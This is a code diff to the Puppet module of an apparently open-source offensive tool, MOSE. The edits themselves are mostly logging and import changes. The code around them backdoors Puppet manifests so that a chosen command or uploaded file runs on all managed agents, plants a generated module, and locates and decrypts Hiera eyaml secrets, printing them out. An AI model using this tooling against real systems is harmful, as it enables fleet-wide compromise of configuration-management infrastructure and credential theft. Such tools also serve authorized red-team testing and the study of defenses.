@@ -15,12 +15,11 @@ import (
 	"strings"
 	"text/template"
 
-	"github.com/l50/mose/pkg/moseutils"
-	"github.com/l50/mose/pkg/netutils"
-	"github.com/l50/mose/pkg/system"
+	"github.com/master-of-servers/mose/pkg/moseutils"
+	"github.com/master-of-servers/mose/pkg/netutils"
+	"github.com/master-of-servers/mose/pkg/system"
 
 	"github.com/markbates/pkger"
-	"github.com/rs/zerolog"
 	"github.com/rs/zerolog/log"
 )
 
@@ -48,10 +47,12 @@ var (
 	uploadFileName  = a.FileName
 	uploadFilePath  = a.RemoteUploadFilePath
 	puppetBackupLoc = a.PuppetBackupLoc
+	noColor         bool
 )
 
 func init() {
 	flag.BoolVar(&cleanup, "c", false, "Activate cleanup using the file location specified in settings.json")
+	flag.BoolVar(&noColor, "d", false, "Disable color output")
 	flag.Parse()
 }
 
@@ -71,10 +72,10 @@ func getAgents() []string {
 		cmdArr := strings.Fields(cmd)
 		cmdOut, err = system.RunCommand(cmdArr[0], cmdArr[1:]...)
 		if err == nil {
-			log.Debug().Msgf("Running %v\n", cmd)
+			log.Debug().Msgf("Running %v", cmd)
 			break
 		}
-		log.Debug().Msgf("%v is not working on this system\n", cmd)
+		log.Debug().Msgf("%v is not working on this system", cmd)
 	}
 
 	agents := cleanAgentOutput(cmdOut)
@@ -101,7 +102,7 @@ func getModules(moduleLoc string) []string {
 	}
 	err = json.Unmarshal([]byte(cmdOut), &jsonOut)
 	if err != nil {
-		log.Log().Msgf("Error: Unable to unmarshal %v", jsonOut)
+		moseutils.ColorMsgf("Error: Unable to unmarshal %v", jsonOut)
 	}
 	preParsed := jsonOut["modules_by_path"].(map[string]interface{})
 	for key, value := range preParsed {
@@ -141,7 +142,7 @@ func backupManifest(manifestLoc string) {
 		_ = system.CpFile(manifestLoc, path+".bak.mose")
 		return
 	}
-	log.Log().Msgf("Backup of the manifest (%v.bak.mose) already exists.\n", manifestLoc)
+	moseutils.ColorMsgf("Backup of the manifest (%v.bak.mose) already exists.", manifestLoc)
 	return
 }
 
@@ -195,7 +196,7 @@ func generateModule(moduleManifest string, cmd string) bool {
 	_, err = io.Copy(dat, s)
 
 	if err != nil {
-		log.Fatal().Err(err).Msg("")
+		log.Error().Err(err).Msg(fmt.Sprintf("failed to copy %s to %s", dat, s))
 	}
 
 	t, err := template.New("puppetModule").Parse(dat.String())
@@ -227,21 +228,21 @@ func createModule(manifestLoc string, moduleName string, cmd string) {
 	moduleLoc := filepath.Join(puppetCodeLoc, "modules", moduleName)
 	moduleFolders := []string{filepath.Join(moduleLoc, "manifests")}
 	moduleManifest := filepath.Join(moduleLoc, "manifests", "init.pp")
-	if system.CreateFolders(moduleFolders) && generateModule(moduleManifest, cmd) {
-		log.Log().Msgf("Successfully created the %s module at %s", moduleName, moduleManifest)
-		log.Log().Msgf("Adding folder %s to cleanup file\n", moduleFolders)
+	if system.CreateDirectories(moduleFolders) && generateModule(moduleManifest, cmd) {
+		moseutils.ColorMsgf("Successfully created the %s module at %s", moduleName, moduleManifest)
+		moseutils.ColorMsgf("Adding folder %s to cleanup file", moduleFolders)
 		// Track the folders for clean up purposes
 		moseutils.TrackChanges(cleanupFile, moduleLoc)
 		if uploadFileName != "" {
 			moduleFiles := filepath.Join(moduleLoc, "files")
 
-			system.CreateFolders([]string{moduleFiles})
-			log.Log().Msgf("Copying %s to module location %s\n", uploadFileName, moduleFiles)
+			system.CreateDirectories([]string{moduleFiles})
+			moseutils.ColorMsgf("Copying %s to module location %s", uploadFileName, moduleFiles)
 			_ = system.CpFile(uploadFileName, filepath.Join(moduleFiles, filepath.Base(uploadFileName)))
 			if err := os.Chmod(filepath.Join(moduleFiles, filepath.Base(uploadFileName)), 0644); err != nil {
 				log.Fatal().Err(err).Msg("")
 			}
-			log.Log().Msgf("Successfully copied and set the proper permissions for %s", filepath.Join(moduleFiles, filepath.Base(uploadFileName)))
+			moseutils.ColorMsgf("Successfully copied and set the proper permissions for %s", filepath.Join(moduleFiles, filepath.Base(uploadFileName)))
 		}
 	} else {
 		log.Fatal().Msgf("Failed to create %s module", moduleName)
@@ -296,7 +297,7 @@ func findHieraSecrets() {
 		// Grep for ENC[
 		matches = system.GrepFile(file, reg)
 		if len(matches) > 0 {
-			log.Log().Msgf("Found secret(s) in file: %s", file)
+			moseutils.ColorMsgf("Found secret(s) in file: %s", file)
 			for k := range secretKeys {
 				res, err := system.RunCommand(eyamlFile, "decrypt",
 					"--pkcs7-public-key="+k+secretKeys[k].publicKey,
@@ -306,7 +307,7 @@ func findHieraSecrets() {
 					log.Printf("Error running command: %s decrypt -f %s %v", eyamlFile, file, err)
 				}
 				if !strings.Contains(res, "bad decrypt") {
-					log.Log().Msgf("%s", res)
+					moseutils.ColorMsgf("%s", res)
 				}
 			}
 		}
@@ -327,10 +328,10 @@ func doCleanup(manifestLocs []string) {
 			path = filepath.Join(puppetBackupLoc, filepath.Base(manifestLoc))
 		}
 
-		path = path + ".bak.mose"
+		path += ".bak.mose"
 
 		if !system.FileExists(path) {
-			log.Log().Msgf("Backup file %s does not exist, skipping", path)
+			moseutils.ColorMsgf("Backup file %s does not exist, skipping", path)
 			continue
 		}
 		ans2 := false
@@ -350,19 +351,15 @@ func doCleanup(manifestLocs []string) {
 }
 
 func main() {
-	zerolog.SetGlobalLevel(zerolog.InfoLevel)
-	if debug {
-		zerolog.SetGlobalLevel(zerolog.DebugLevel)
-	}
-	log.Logger = log.Output(zerolog.ConsoleWriter{Out: os.Stderr})
-	// If we're not root, we probably can't backdoor any of the puppet code, so exit
-	// This may not always be true as per https://puppet.com/blog/puppet-without-root-a-real-life-example
-	// But we are going with it as an assumption based on polling various DevOps engineers and Site Reliability engineers
+	moseutils.NOCOLOR = noColor
+	moseutils.SetupLogger(debug)
 	system.CheckRoot()
 	manifestLocs := getExistingManifests()
 
 	if cleanup {
+		log.Log().Msg("Cleanup")
 		doCleanup(manifestLocs)
+		os.Exit(0)
 	}
 
 	if uploadFilePath != "" {
@@ -377,14 +374,14 @@ func main() {
 		}
 
 		if uploadFileName != "" {
-			log.Log().Msgf("Backdooring the %s manifest to run %s on all associated Puppet agents, please wait...", manifestLoc, uploadFileName)
+			moseutils.ColorMsgf("Backdooring the %s manifest to run %s on all associated Puppet agents, please wait...", manifestLoc, uploadFileName)
 		} else {
-			log.Log().Msgf("Backdooring the %s manifest to run %s on all associated Puppet agents, please wait...", manifestLoc, cmd)
+			moseutils.ColorMsgf("Backdooring the %s manifest to run %s on all associated Puppet agents, please wait...", manifestLoc, cmd)
 		}
 
 		backdoorManifest(manifestLoc)
 		modules := getModules(getPuppetCodeLoc(manifestLoc) + "/modules")
-		log.Log().Msgf("The following modules were found: %v", modules)
+		moseutils.ColorMsgf("The following modules were found: %v", modules)
 		createModule(manifestLoc, moduleName, cmd)
 	}
 	agents := getAgents()
